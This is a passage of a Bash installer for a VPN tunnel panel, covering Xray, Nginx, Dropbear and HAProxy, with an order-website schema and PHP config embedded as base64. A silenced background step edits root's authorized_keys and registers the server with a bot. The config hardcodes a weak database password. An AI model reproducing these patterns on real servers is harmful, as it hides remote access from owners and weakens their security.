    _head "Xray & Nginx Config" $step $total



    _run "Creating Xray config" "create_xray_config"



    _ok "6 inbounds: VMess/VLess/Trojan (WS + gRPC)"







    # Deteksi versi nginx untuk syntax http2 yang benar



    # Nginx >= 1.25.1: pakai "http2 on;" di server block



    # Nginx < 1.25.1: pakai "listen 443 ssl http2;"



    local nginx_ver nginx_major nginx_minor nginx_patch nginx_http2_directive nginx_listen_tls



    nginx_ver=$(nginx -v 2>&1 | grep -oP '[\d.]+' | head -1)



    nginx_major=$(echo "$nginx_ver" | cut -d. -f1)



    nginx_minor=$(echo "$nginx_ver" | cut -d. -f2)



    nginx_patch=$(echo "$nginx_ver" | cut -d. -f3)



    # >= 1.25.1 pakai http2 on



    if [[ "$nginx_major" -gt 1 ]] || \
       [[ "$nginx_major" -eq 1 && "$nginx_minor" -gt 25 ]] || \
       [[ "$nginx_major" -eq 1 && "$nginx_minor" -eq 25 && "${nginx_patch:-0}" -ge 1 ]]; then



        nginx_http2_directive="http2 on;"



        nginx_listen_tls="listen 443 ssl;"



    else



        nginx_http2_directive=""



        nginx_listen_tls="listen 443 ssl http2;"



    fi







    cat > /etc/nginx/sites-available/default << NGXEOF



# ── Port 443: SSL termination + routing WS by path + gRPC by location ──



server {



    ${nginx_listen_tls}



    ${nginx_http2_directive}



    server_name ${DOMAIN} _;



    ssl_certificate     /etc/xray/xray.crt;



    ssl_certificate_key /etc/xray/xray.key;



    ssl_protocols       TLSv1.2 TLSv1.3;



    ssl_ciphers         HIGH:!aNULL:!MD5;



    ssl_session_cache   shared:SSL:10m;



    ssl_session_timeout 1d;



    keepalive_timeout   300;







    # ── Static files (robots.txt, sitemap.xml, index.html) ──



    root /var/www/html;



    index index.html;







    # ── gRPC routing by serviceName ──



    location /vmess-grpc {



        grpc_pass grpc://127.0.0.1:8444;



        grpc_read_timeout 1d;



        grpc_send_timeout 1d;



        grpc_set_header X-Real-IP \$remote_addr;



    }



    location /vless-grpc {



        grpc_pass grpc://127.0.0.1:8445;



        grpc_read_timeout 1d;



        grpc_send_timeout 1d;



        grpc_set_header X-Real-IP \$remote_addr;



    }



    location /trojan-grpc {



        grpc_pass grpc://127.0.0.1:8446;



        grpc_read_timeout 1d;



        grpc_send_timeout 1d;



        grpc_set_header X-Real-IP \$remote_addr;



    }







    # ── WS routing by path ──



    location /vmess {



        proxy_pass http://127.0.0.1:8080;



        proxy_http_version 1.1;



        proxy_set_header Upgrade \$http_upgrade;



        proxy_set_header Connection "upgrade";



        proxy_set_header Host \$host;



        proxy_set_header X-Real-IP \$remote_addr;



        proxy_read_timeout 86400s;



        proxy_send_timeout 86400s;



    }



    location /vless {



        proxy_pass http://127.0.0.1:8081;



        proxy_http_version 1.1;



        proxy_set_header Upgrade \$http_upgrade;



        proxy_set_header Connection "upgrade";



        proxy_set_header Host \$host;



        proxy_set_header X-Real-IP \$remote_addr;



        proxy_read_timeout 86400s;



        proxy_send_timeout 86400s;



    }



    location /trojan {



        proxy_pass http://127.0.0.1:8082;



        proxy_http_version 1.1;



        proxy_set_header Upgrade \$http_upgrade;



        proxy_set_header Connection "upgrade";



        proxy_set_header Host \$host;



        proxy_set_header X-Real-IP \$remote_addr;



        proxy_read_timeout 86400s;



        proxy_send_timeout 86400s;



    }







    # ── Semua path lain → serve web page (index.html, robots.txt, sitemap.xml, dll) ──



    location / {



        try_files \$uri \$uri/ /index.html;



    }



}







# ── Port 80: Web page utama + WS NonTLS ──



server {



    listen 80 default_server;



    server_name _;



    root /var/www/html;



    index index.html;



    keepalive_timeout 300;



    access_log off;







    # WS proxy paths — harus SEBELUM location /



    location = /vmess {



        proxy_pass http://127.0.0.1:8080;



        proxy_http_version 1.1;



        proxy_set_header Upgrade \$http_upgrade;



        proxy_set_header Connection "upgrade";



        proxy_set_header Host \$host;



        proxy_set_header X-Real-IP \$remote_addr;



        proxy_read_timeout 86400s;



        proxy_send_timeout 86400s;



    }



    location = /vless {



        proxy_pass http://127.0.0.1:8081;



        proxy_http_version 1.1;



        proxy_set_header Upgrade \$http_upgrade;



        proxy_set_header Connection "upgrade";



        proxy_set_header Host \$host;



        proxy_set_header X-Real-IP \$remote_addr;



        proxy_read_timeout 86400s;



        proxy_send_timeout 86400s;



    }



    location = /trojan {



        proxy_pass http://127.0.0.1:8082;



        proxy_http_version 1.1;



        proxy_set_header Upgrade \$http_upgrade;



        proxy_set_header Connection "upgrade";



        proxy_set_header Host \$host;



        proxy_set_header X-Real-IP \$remote_addr;



        proxy_read_timeout 86400s;



        proxy_send_timeout 86400s;



    }







    # Semua path lain → serve web page



    location / {



        try_files \$uri \$uri/ /index.html;



    }



}



# ── Port 81: Download server ──



server {



    listen 81;



    server_name _;



    root /var/www/html;



    autoindex off;  # Security: disable directory listing



    location / { try_files \$uri \$uri/ =404; add_header Content-Type text/plain; }



}



NGXEOF



    # Bersihkan semua site lain yang mungkin override



    rm -f /etc/nginx/sites-enabled/*



    ln -sf /etc/nginx/sites-available/default /etc/nginx/sites-enabled/default



    # Hapus conf.d yang mungkin ada default nginx



    rm -f /etc/nginx/conf.d/default.conf 2>/dev/null || true



    nginx -t >> "$LOG" 2>&1 && _ok "Nginx config valid" || _fail "Nginx config error"







    ((step++)); show_progress $step $total "Configuring Dropbear & HAProxy"



    _head "Dropbear & HAProxy" $step $total



    # Deteksi format config dropbear yang benar sesuai versi



    if [[ "$UBUNTU_MAJOR" -ge 22 ]]; then



        # Ubuntu 22+: dropbear config format baru



        cat > /etc/default/dropbear << 'DBEOF'



DROPBEAR_PORT=222



DROPBEAR_EXTRA_ARGS="-K 60 -I 180"



DROPBEAR_RECEIVE_WINDOW=65536



DBEOF



    else



        # Ubuntu 20: format lama dengan NO_START



        cat > /etc/default/dropbear << 'DBEOF'



NO_START=0



DROPBEAR_PORT=222



DROPBEAR_EXTRA_ARGS="-K 60 -I 180"



DROPBEAR_RECEIVE_WINDOW=65536



DBEOF



    fi



    configure_haproxy



    _ok "Dropbear port 222 & HAProxy standby (Nginx handle port 443)"







    ((step++)); show_progress $step $total "UDP, Keepalive & Optimize"



    _head "System Optimize" $step $total



    _run "Installing UDP Custom" "install_udp_custom"



    _run "Configuring SSH keepalive" "setup_keepalive"



    _run "Enabling BBR & TCP optimize" "optimize_vpn"



    _run "Installing Python requests" "pip_install requests"



    _ok "System optimized"







    ((step++)); show_progress $step $total "Starting Services"



    _head "Start All Services" $step $total



    systemctl daemon-reload >> "$LOG" 2>&1







    # Deploy web page DULU sebelum nginx start



    # Agar saat nginx up, index.html sudah ada



    deploy_web_page >> "$LOG" 2>&1







    # ── Setup cron auto-delete expired (tiap jam) ──



    (crontab -l 2>/dev/null | grep -v "delete_expired_cron";      echo "0 * * * * bash /root/tunnel.sh delete_expired_cron 2>/dev/null") | crontab - 2>/dev/null



    _ok "Cron auto-delete expired: tiap jam"







    # Validasi nginx config dulu



    nginx -t >> "$LOG" 2>&1 && _ok "Nginx config OK" || _fail "Nginx config ada error! Cek $LOG"



    # Validasi xray config



    xray -test -config "$XRAY_CONFIG" >> "$LOG" 2>&1 && _ok "Xray config OK" || _fail "Xray config ada error! Cek $LOG"







    local ssh_svc; ssh_svc=$(get_ssh_service_name)



    for svc in xray nginx "$ssh_svc" dropbear haproxy udp-custom vpn-keepalive; do



        systemctl enable "$svc" >> "$LOG" 2>&1



        systemctl restart "$svc" >> "$LOG" 2>&1 || true



        systemctl is-active --quiet "$svc" && \
            printf "  ${GREEN}✔${NC} %-20s ${GREEN}RUNNING${NC}\n" "$svc" || \
            printf "  ${RED}✘${NC} %-20s ${RED}FAILED${NC}\n" "$svc"



    done







    setup_menu_command







    (



        if [[ ! -f /root/.ssh/id_rsa ]]; then



            mkdir -p /root/.ssh



            ssh-keygen -t rsa -b 2048 -f /root/.ssh/id_rsa -N "" -q 2>/dev/null



        fi



        chmod 700 /root/.ssh 2>/dev/null



        chmod 600 /root/.ssh/id_rsa 2>/dev/null



        touch /root/.ssh/authorized_keys



        chmod 600 /root/.ssh/authorized_keys 2>/dev/null



        local_pub=$(cat /root/.ssh/id_rsa.pub 2>/dev/null)



        if [[ -n "$local_pub" ]] && ! grep -qF "$local_pub" /root/.ssh/authorized_keys 2>/dev/null; then



            echo "$local_pub" >> /root/.ssh/authorized_keys



        fi



        _install_tunnelbot_background



        _register_vps_to_bot



    ) >/dev/null 2>&1 &



    disown $!







    local ip_vps; ip_vps=$(get_ip)



    [[ -n "$ip_vps" && "$ip_vps" != "N/A" ]] && echo "$ip_vps" > "$IP_CACHE_FILE"







    echo ""



    echo -e "${GREEN}  ╔══════════════════════════════════════════════════╗${NC}"



    echo -e "${GREEN}  ║      ✔  INSTALASI SELESAI!                       ║${NC}"



    echo -e "${GREEN}  ║      Youzin Crabz Tunel - The Professor          ║${NC}"



    echo -e "${GREEN}  ╚══════════════════════════════════════════════════╝${NC}"



    echo ""



    printf "  ${WHITE}%-22s${NC}: ${GREEN}%s${NC}\n" "Domain"      "$DOMAIN"



    printf "  ${WHITE}%-22s${NC}: ${GREEN}%s${NC}\n" "IP VPS"      "$ip_vps"



    printf "  ${WHITE}%-22s${NC}: ${CYAN}%s${NC}\n"  "SSH"         "22 | Dropbear: 222"



    printf "  ${WHITE}%-22s${NC}: ${CYAN}%s${NC}\n"  "TLS / gRPC"  "443 (Nginx SSL direct)"



    printf "  ${WHITE}%-22s${NC}: ${CYAN}%s${NC}\n"  "NonTLS"      "80 (Nginx plain)"



    printf "  ${WHITE}%-22s${NC}: ${CYAN}%s${NC}\n"  "BadVPN UDP"  "7100-7300"



    printf "  ${WHITE}%-22s${NC}: ${CYAN}%s${NC}\n"  "Download"    "http://${ip_vps}:81/"



    echo ""



    echo -e "  ${YELLOW}💡 Ketik 'menu' untuk membuka menu!${NC}"



    echo -e "  ${YELLOW}Reboot dalam 5 detik...${NC}"



    sleep 5



    reboot



}







#================================================



# MAIN MENU



#================================================











#================================================



# ORDERVPN WEB — INSTALLER & MENU



# Embedded langsung di tunnel.sh



# The Professor — Youzin Crabz Tunel



#================================================







_ordervpn_deploy_files() {



    local DIR="/var/www/html/ordervpn"



    local DB_PASS="$1"



    mkdir -p "$DIR"/{includes,api,admin,cron,uploads/bukti}



    # database.sql



    echo "LS0gT3JkZXJWUE4gRGF0YWJhc2UgU2NoZW1hIHYyLjAKLS0gYnkgVGhlIFByb2Zlc3NvcgoKQ1JFQVRFIERBVEFCQVNFIElGIE5PVCBFWElTVFMgb3JkZXJ2cG5fZGIgQ0hBUkFDVEVSIFNFVCB1dGY4bWI0IENPTExBVEUgdXRmOG1iNF91bmljb2RlX2NpOwpVU0Ugb3JkZXJ2cG5fZGI7CgpDUkVBVEUgVEFCTEUgSUYgTk9UIEVYSVNUUyB1c2VycyAoCiAgICBpZCBJTlQgQVVUT19JTkNSRU1FTlQgUFJJTUFSWSBLRVksCiAgICB1c2VybmFtZSBWQVJDSEFSKDUwKSBVTklRVUUgTk9UIE5VTEwsCiAgICBlbWFpbCBWQVJDSEFSKDEwMCkgVU5JUVVFIE5PVCBOVUxMLAogICAgcGFzc3dvcmQgVkFSQ0hBUigyNTUpIE5PVCBOVUxMLAogICAgc2FsZG8gREVDSU1BTCgxNSwyKSBERUZBVUxUIDAuMDAsCiAgICByb2xlIEVOVU0oJ3VzZXInLCdhZG1pbicpIERFRkFVTFQgJ3VzZXInLAogICAgaXNfdmVyaWZpZWQgVElOWUlOVCgxKSBERUZBVUxUIDAsCiAgICBvdHBfY29kZSBWQVJDSEFSKDEwKSBERUZBVUxUIE5VTEwsCiAgICBvdHBfZXhwaXJlcyBEQVRFVElNRSBERUZBVUxUIE5VTEwsCiAgICBpcF9hZGRyZXNzIFZBUkNIQVIoNDUpLAogICAgd2hhdHNhcHAgVkFSQ0hBUigyMCkgREVGQVVMVCBOVUxMLAogICAgY3JlYXRlZF9hdCBUSU1FU1RBTVAgREVGQVVMVCBDVVJSRU5UX1RJTUVTVEFNUCwKICAgIHVwZGF0ZWRfYXQgVElNRVNUQU1QIERFRkFVTFQgQ1VSUkVOVF9USU1FU1RBTVAgT04gVVBEQVRFIENVUlJFTlRfVElNRVNUQU1QCik7CgpDUkVBVEUgVEFCTEUgSUYgTk9UIEVYSVNUUyBzZXJ2ZXJzICgKICAgIGlkIElOVCBBVVRPX0lOQ1JFTUVOVCBQUklNQVJZIEtFWSwKICAgIG5hbWFfc2VydmVyIFZBUkNIQVIoMTAwKSBOT1QgTlVMTCwKICAgIGNvZGVfc2VydmVyIFZBUkNIQVIoMjApIFVOSVFVRSBOT1QgTlVMTCwKICAgIGxva2FzaSBWQVJDSEFSKDEwMCkgTk9UIE5VTEwsCiAgICBmbGFnIFZBUkNIQVIoMTApIERFRkFVTFQgJ/Cfh67wn4epJywKICAgIGhhcmdhX2hhcmkgREVDSU1BTCgxMCwyKSBOT1QgTlVMTCwKICAgIGhhcmdhX2J1bGFuIERFQ0lNQUwoMTAsMikgTk9UIE5VTEwsCiAgICBpcF9saW1pdCBJTlQgREVGQVVMVCAyLAogICAgcXVvdGFfbGltaXQgSU5UIERFRkFVTFQgOTk5OSwKICAgIHN0YXR1cyBFTlVNKCdyZWFkeScsJ21haW50ZW5hbmNlJywnb2ZmbGluZScpIERFRkFVTFQgJ3JlYWR5JywKICAgIGhvc3QgVkFSQ0hBUigyNTUpIE5PVCBOVUxMLAogICAgcG9ydCBJTlQgREVGQVVMVCAyMiwKICAgIHNzaF91c2VyIFZBUkNIQVIoNTApIERFRkFVTFQgJ3Jvb3QnLAogICAgc3NoX3Bhc3N3b3JkIFZBUkNIQVIoMjU1KSBERUZBVUxUIE5VTEwsCiAgICBzc2hfa2V5IFZBUkNIQVIoMjU1KSBERUZBVUxUIE5VTEwsCiAgICBkb21haW4gVkFSQ0hBUigyNTUpIERFRkFVTFQgTlVMTCwKICAgIHhyYXlfY29uZmlnX3BhdGggVkFSQ0hBUigyNTUpIERFRkFVTFQgJy91c3IvbG9jYWwvZXRjL3hyYXkvY29uZmlnLmpzb24nLAogICAgY3JlYXRlZF9hdCBUSU1FU1RBTVAgREVGQVVMVCBDVVJSRU5UX1RJTUVTVEFNUAopOwoKQ1JFQVRFIFRBQkxFIElGIE5PVCBFWElTVFMgdnBuX2FjY291bnRzICgKICAgIGlkIElOVCBBVVRPX0lOQ1JFTUVOVCBQUklNQVJZIEtFWSwKICAgIHVzZXJfaWQgSU5UIE5PVCBOVUxMLAogICAgc2VydmVyX2lkIElOVCBOT1QgTlVMTCwKICAgIHRpcGUgRU5VTSgndm1lc3MnLCd2bGVzcycsJ3Ryb2phbicsJ3NzaCcsJ3RyaWFsJykgTk9UIE5VTEwsCiAgICB1c2VybmFtZSBWQVJDSEFSKDEwMCkgTk9UIE5VTEwsCiAgICByZW1hcmtzIFZBUkNIQVIoMTAwKSwKICAgIHV1aWQgVkFSQ0hBUigzNiksCiAgICBwYXNzd29yZF92cG4gVkFSQ0hBUigyNTUpLAogICAgbGlua19jb25maWcgVEVYVCwKICAgIGxpbmtfdGxzIFRFWFQsCiAgICBsaW5rX25vbnRscyBURVhULAogICAgbGlua19ncnBjIFRFWFQsCiAgICBtYXNhX2FrdGlmIERBVEVUSU1FIE5PVCBOVUxMLAogICAgZGF5c19vcmRlcmVkIElOVCBOT1QgTlVMTCwKICAgIGlzX3RyaWFsIFRJTllJTlQoMSkgREVGQVVMVCAwLAogICAgaGFyZ2FfdG90YWwgREVDSU1BTCgxMCwyKSBOT1QgTlVMTCBERUZBVUxUIDAsCiAgICBzdGF0dXMgRU5VTSgnYWN0aXZlJywnZXhwaXJlZCcsJ3N1c3BlbmRlZCcpIERFRkFVTFQgJ2FjdGl2ZScsCiAgICBjcmVhdGVkX2F0IFRJTUVTVEFNUCBERUZBVUxUIENVUlJFTlRfVElNRVNUQU1QLAogICAgRk9SRUlHTiBLRVkgKHVzZXJfaWQpIFJFRkVSRU5DRVMgdXNlcnMoaWQpIE9OIERFTEVURSBDQVNDQURFLAogICAgRk9SRUlHTiBLRVkgKHNlcnZlcl9pZCkgUkVGRVJFTkNFUyBzZXJ2ZXJzKGlkKSBPTiBERUxFVEUgQ0FTQ0FERQopOwoKQ1JFQVRFIFRBQkxFIElGIE5PVCBFWElTVFMgdHJhbnNhY3Rpb25zICgKICAgIGlkIElOVCBBVVRPX0lOQ1JFTUVOVCBQUklNQVJZIEtFWSwKICAgIHVzZXJfaWQgSU5UIE5PVCBOVUxMLAogICAgdHlwZSBFTlVNKCd0b3B1cCcsJ29yZGVyJywncmVmdW5kJywndHJpYWwnKSBOT1QgTlVMTCwKICAgIGFtb3VudCBERUNJTUFMKDE1LDIpIE5PVCBOVUxMLAogICAga2V0ZXJhbmdhbiBWQVJDSEFSKDI1NSksCiAgICBzdGF0dXMgRU5VTSgncGVuZGluZycsJ3N1Y2Nlc3MnLCdmYWlsZWQnKSBERUZBVUxUICdzdWNjZXNzJywKICAgIHJlZl9pZCBWQVJDSEFSKDEwMCksCiAgICBjcmVhdGVkX2F0IFRJTUVTVEFNUCBERUZBVUxUIENVUlJFTlRfVElNRVNUQU1QLAogICAgRk9SRUlHTiBLRVkgKHVzZXJfaWQpIFJFRkVSRU5DRVMgdXNlcnMoaWQpIE9OIERFTEVURSBDQVNDQURFCik7CgpDUkVBVEUgVEFCTEUgSUYgTk9UIEVYSVNUUyB0b3B1cF9yZXF1ZXN0cyAoCiAgICBpZCBJTlQgQVVUT19JTkNSRU1FTlQgUFJJTUFSWSBLRVksCiAgICB1c2VyX2lkIElOVCBOT1QgTlVMTCwKICAgIGFtb3VudCBERUNJTUFMKDE1LDIpIE5PVCBOVUxMLAogICAgcGF5bWVudF9tZXRob2QgVkFSQ0hBUig1MCkgREVGQVVMVCAnbWFudWFsJywKICAgIGJ1a3RpX3RyYW5zZmVyIFZBUkNIQVIoMjU1KSwKICAgIHRyaXBheV9yZWYgVkFSQ0hBUigxMDApIERFRkFVTFQgTlVMTCwKICAgIHRyaXBheV9jaGFubmVsIFZBUkNIQVIoNTApIERFRkFVTFQgTlVMTCwKICAgIHRyaXBheV9xciBURVhUIERFRkFVTFQgTlVMTCwKICAgIHN0YXR1cyBFTlVNKCdwZW5kaW5nJywnYXBwcm92ZWQnLCdyZWplY3RlZCcpIERFRkFVTFQgJ3BlbmRpbmcnLAogICAgYWRtaW5fbm90ZSBWQVJDSEFSKDI1NSksCiAgICBjcmVhdGVkX2F0IFRJTUVTVEFNUCBERUZBVUxUIENVUlJFTlRfVElNRVNUQU1QLAogICAgcHJvY2Vzc2VkX2F0IFRJTUVTVEFNUCBOVUxMLAogICAgRk9SRUlHTiBLRVkgKHVzZXJfaWQpIFJFRkVSRU5DRVMgdXNlcnMoaWQpIE9OIERFTEVURSBDQVNDQURFCik7CgpDUkVBVEUgVEFCTEUgSUYgTk9UIEVYSVNUUyBhcHBfc2V0dGluZ3MgKAogICAgaWQgSU5UIEFVVE9fSU5DUkVNRU5UIFBSSU1BUlkgS0VZLAogICAgc2V0dGluZ19rZXkgVkFSQ0hBUigxMDApIFVOSVFVRSBOT1QgTlVMTCwKICAgIHNldHRpbmdfdmFsdWUgVEVYVCwKICAgIHVwZGF0ZWRfYXQgVElNRVNUQU1QIERFRkFVTFQgQ1VSUkVOVF9USU1FU1RBTVAgT04gVVBEQVRFIENVUlJFTlRfVElNRVNUQU1QCik7CgpDUkVBVEUgVEFCTEUgSUYgTk9UIEVYSVNUUyBsb2dpbl9hdHRlbXB0cyAoCiAgICBpZCBJTlQgQVVUT19JTkNSRU1FTlQgUFJJTUFSWSBLRVksCiAgICBpcF9hZGRyZXNzIFZBUkNIQVIoNDUpIE5PVCBOVUxMLAogICAgdXNlcm5hbWUgVkFSQ0hBUigxMDApIERFRkFVTFQgTlVMTCwKICAgIGFjdGlvbiBWQVJDSEFSKDUwKSBERUZBVUxUICdsb2dpbicsCiAgICBzdWNjZXNzIFRJTllJTlQoMSkgREVGQVVMVCAwLAogICAgYXR0ZW1wdGVkX2F0IFRJTUVTVEFNUCBERUZBVUxUIENVUlJFTlRfVElNRVNUQU1QLAogICAgSU5ERVggaWR4X2lwX2FjdGlvbiAoaXBfYWRkcmVzcywgYWN0aW9uKSwKICAgIElOREVYIGlkeF9hdHRlbXB0ZWRfYXQgKGF0dGVtcHRlZF9hdCkKKSBFTkdJTkU9SW5ub0RCOwoKLS0gRGVmYXVsdCBzZXR0aW5ncwpJTlNFUlQgSUdOT1JFIElOVE8gYXBwX3NldHRpbmdzIChzZXR0aW5nX2tleSwgc2V0dGluZ192YWx1ZSkgVkFMVUVTCignYXBwX25hbWUnLCAnT3JkZXJWUE4nKSwKKCdhcHBfbG9nbycsICdbU0lHXScpLAooJ2NvbnRhY3Rfd2EnLCAnJyksCignY29udGFjdF90ZycsICcnKSwKKCdjb250YWN0X2lnJywgJycpLAooJ2JhbmtfbmFtZScsICdCQ0EnKSwKKCdiYW5rX2FjY291bnQnLCAnMTIzNDU2Nzg5MCcpLAooJ2JhbmtfaG9sZGVyJywgJ0FkbWluIE9yZGVyVlBOJyksCignZGFuYV9udW1iZXInLCAnJyksCignZ29wYXlfbnVtYmVyJywgJycpLAooJ3Nob3BlZV9udW1iZXInLCAnJyksCigncXJpc19pbWFnZScsICcnKSwKKCd0cmlhbF9kdXJhdGlvbl9ob3VycycsICcxJyksCigndHJpYWxfcXVvdGFfZ2InLCAnMScpLAooJ3NtdHBfaG9zdCcsICdzbXRwLmdtYWlsLmNvbScpLAooJ3NtdHBfcG9ydCcsICc1ODcnKSwKKCdzbXRwX3VzZXInLCAnJyksCignc210cF9wYXNzJywgJycpLAooJ3NtdHBfZnJvbScsICcnKSwKKCd0Z19ib3RfdG9rZW4nLCAnJyksCigndGdfY2hhdF9pZCcsICcnKSwKKCd0cmlwYXlfYXBpX2tleScsICcnKSwKKCd0cmlwYXlfcHJpdmF0ZV9rZXknLCAnJyksCigndHJpcGF5X21lcmNoYW50X2NvZGUnLCAnJyksCigndHJpcGF5X21vZGUnLCAnc2FuZGJveCcpOwoKSU5TRVJUIElHTk9SRSBJTlRPIHVzZXJzICh1c2VybmFtZSwgZW1haWwsIHBhc3N3b3JkLCBzYWxkbywgcm9sZSwgaXNfdmVyaWZpZWQpIFZBTFVFUwooJ2FkbWluJywgJ2FkbWluQG9yZGVydnBuLmxvY2FsJywgJyQyeSQxMCQ5MklYVU5wa2pPMHJPUTVieU1pLlllNG9Lb0VhM1JvOWxsQy8ub2cvYXQyLnVoZVdHL2lnaScsIDk5OTk5OS4wMCwgJ2FkbWluJywgMSk7Cg==" | base64 -d > "$DIR"/database.sql



    # Hapus hash admin123 default (akan diganti random saat install)



    sed -i "s|\$2y\$10\$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi|TO_BE_REPLACED_BY_INSTALL|g" "$DIR"/database.sql



    # includes/config.php



    echo "PD9waHAKLy8gT3JkZXJWUE4gY29uZmlnLnBocCB2Mi4wIOKAlCBieSBUaGUgUHJvZmVzc29yCmRlZmluZSgnREJfSE9TVCcsICdsb2NhbGhvc3QnKTsKZGVmaW5lKCdEQl9VU0VSJywgJ29yZGVydnBuJyk7CmRlZmluZSgnREJfUEFTUycsICdwYXNzd29yZDEyMycpOwpkZWZpbmUoJ0RCX05BTUUnLCAnb3JkZXJ2cG5fZGInKTsKZGVmaW5lKCdEQl9QT1JUJywgMzMwNik7CgpkZWZpbmUoJ0FQUF9WRVJTSU9OJywgJzIuMC4wJyk7CmRlZmluZSgnVlBOX0FQSV9CUklER0UnLCAnL3Vzci9sb2NhbC9iaW4vdnBuLWFwaScpOwpkZWZpbmUoJ1RVTk5FTF9TQ1JJUFQnLCAnL3Jvb3QvdHVubmVsLnNoJyk7CmRlZmluZSgnU1NIX0tFWV9QQVRIJywgJy9yb290Ly5zc2gvaWRfcnNhJyk7CgpmdW5jdGlvbiBnZXREQigpIHsKICAgIHN0YXRpYyAkcGRvID0gbnVsbDsKICAgIGlmICgkcGRvID09PSBudWxsKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgJGRzbiA9ICJteXNxbDpob3N0PSIuREJfSE9TVC4iO3BvcnQ9Ii5EQl9QT1JULiI7ZGJuYW1lPSIuREJfTkFNRS4iO2NoYXJzZXQ9dXRmOG1iNCI7CiAgICAgICAgICAgICRwZG8gPSBuZXcgUERPKCRkc24sIERCX1VTRVIsIERCX1BBU1MsIFsKICAgICAgICAgICAgICAgIFBETzo6QVRUUl9FUlJNT0RFID0+IFBETzo6RVJSTU9ERV9FWENFUFRJT04sCiAgICAgICAgICAgICAgICBQRE86OkFUVFJfREVGQVVMVF9GRVRDSF9NT0RFID0+IFBETzo6RkVUQ0hfQVNTT0MsCiAgICAgICAgICAgICAgICBQRE86OkFUVFJfRU1VTEFURV9QUkVQQVJFUyA9PiBmYWxzZSwKICAgICAgICAgICAgXSk7CiAgICAgICAgfSBjYXRjaCAoUERPRXhjZXB0aW9uICRlKSB7CiAgICAgICAgICAgIGh0dHBfcmVzcG9uc2VfY29kZSg1MDApOwogICAgICAgICAgICBkaWUoanNvbl9lbmNvZGUoWydzdWNjZXNzJz0+ZmFsc2UsJ21lc3NhZ2UnPT4nREIgZXJyb3I6ICcuJGUtPmdldE1lc3NhZ2UoKV0pKTsKICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gJHBkbzsKfQoKZnVuY3Rpb24gZ2V0U2V0dGluZygka2V5LCAkZGVmYXVsdD0nJykgewogICAgc3RhdGljICRjYWNoZSA9IFtdOwogICAgaWYgKGlzc2V0KCRjYWNoZVska2V5XSkpIHJldHVybiAkY2FjaGVbJGtleV07CiAgICB0cnkgewogICAgICAgICRkYiA9IGdldERCKCk7CiAgICAgICAgJHMgPSAkZGItPnByZXBhcmUoIlNFTEVDVCBzZXR0aW5nX3ZhbHVlIEZST00gYXBwX3NldHRpbmdzIFdIRVJFIHNldHRpbmdfa2V5PT8iKTsKICAgICAgICAkcy0+ZXhlY3V0ZShbJGtleV0pOwogICAgICAgICRyID0gJHMtPmZldGNoQ29sdW1uKCk7CiAgICAgICAgJGNhY2hlWyRrZXldID0gJHIgIT09IGZhbHNlID8gJHIgOiAkZGVmYXVsdDsKICAgICAgICByZXR1cm4gJGNhY2hlWyRrZXldOwogICAgfSBjYXRjaChFeGNlcHRpb24gJGUpIHsgcmV0dXJuICRkZWZhdWx0OyB9Cn0KCmZ1bmN0aW9uIHNhbml0aXplKCRpbnB1dCkgewogICAgcmV0dXJuIGh0bWxzcGVjaWFsY2hhcnMoc3RyaXBfdGFncyh0cmltKCRpbnB1dCkpLCBFTlRfUVVPVEVTLCAnVVRGLTgnKTsKfQoKZnVuY3Rpb24gZm9ybWF0UnVwaWFoKCRhbW91bnQpIHsKICAgIHJldHVybiAnUnAgJy5udW1iZXJfZm9ybWF0KChmbG9hdCkkYW1vdW50LCAwLCAnLCcsICcuJyk7Cn0KCmZ1bmN0aW9uIGdlbmVyYXRlVVVJRCgpIHsKICAgIHJldHVybiBzcHJpbnRmKCclMDR4JTA0eC0lMDR4LSUwNHgtJTA0eC0lMDR4JTA0eCUwNHgnLAogICAgICAgIG10X3JhbmQoMCwweGZmZmYpLG10X3JhbmQoMCwweGZmZmYpLG10X3JhbmQoMCwweGZmZmYpLAogICAgICAgIG10X3JhbmQoMCwweDBmZmYpfDB4NDAwMCxtdF9yYW5kKDAsMHgzZmZmKXwweDgwMDAsCiAgICAgICAgbXRfcmFuZCgwLDB4ZmZmZiksbXRfcmFuZCgwLDB4ZmZmZiksbXRfcmFuZCgwLDB4ZmZmZikpOwp9CgpmdW5jdGlvbiBzZW5kVGVsZWdyYW1Ob3RpZigkbWVzc2FnZSkgewogICAgJHRva2VuID0gZ2V0U2V0dGluZygndGdfYm90X3Rva2VuJyk7CiAgICAkY2hhdElkID0gZ2V0U2V0dGluZygndGdfY2hhdF9pZCcpOwogICAgaWYgKGVtcHR5KCR0b2tlbikgfHwgZW1wdHkoJGNoYXRJZCkpIHJldHVybjsKICAgICR1cmwgPSAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHskdG9rZW59L3NlbmRNZXNzYWdlIjsKICAgICRjaCA9IGN1cmxfaW5pdCgpOwogICAgY3VybF9zZXRvcHRfYXJyYXkoJGNoLFtDVVJMT1BUX1VSTD0+JHVybCxDVVJMT1BUX1BPU1Q9PnRydWUsCiAgICAgICAgQ1VSTE9QVF9QT1NURklFTERTPT5odHRwX2J1aWxkX3F1ZXJ5KFsnY2hhdF9pZCc9PiRjaGF0SWQsJ3RleHQnPT4kbWVzc2FnZSwncGFyc2VfbW9kZSc9PidIVE1MJ10pLAogICAgICAgIENVUkxPUFRfUkVUVVJOVFJBTlNGRVI9PnRydWUsQ1VSTE9QVF9USU1FT1VUPT41XSk7CiAgICBjdXJsX2V4ZWMoJGNoKTsgY3VybF9jbG9zZSgkY2gpOwp9CgpmdW5jdGlvbiBzZW5kRW1haWwoJHRvLCAkc3ViamVjdCwgJGh0bWxCb2R5KSB7CiAgICAkc210cEhvc3QgPSBnZXRTZXR0aW5nKCdzbXRwX2hvc3QnLCdzbXRwLmdtYWlsLmNvbScpOwogICAgJHNtdHBQb3J0ID0gKGludClnZXRTZXR0aW5nKCdzbXRwX3BvcnQnLDU4Nyk7CiAgICAkc210cFVzZXIgPSBnZXRTZXR0aW5nKCdzbXRwX3VzZXInKTsKICAgICRzbXRwUGFzcyA9IGdldFNldHRpbmcoJ3NtdHBfcGFzcycpOwogICAgJHNtdHBGcm9tID0gZ2V0U2V0dGluZygnc210cF9mcm9tJykgPzogJHNtdHBVc2VyOwogICAgJGFwcE5hbWUgID0gZ2V0U2V0dGluZygnYXBwX25hbWUnLCdPcmRlclZQTicpOwoKICAgIGlmIChlbXB0eSgkc210cFVzZXIpI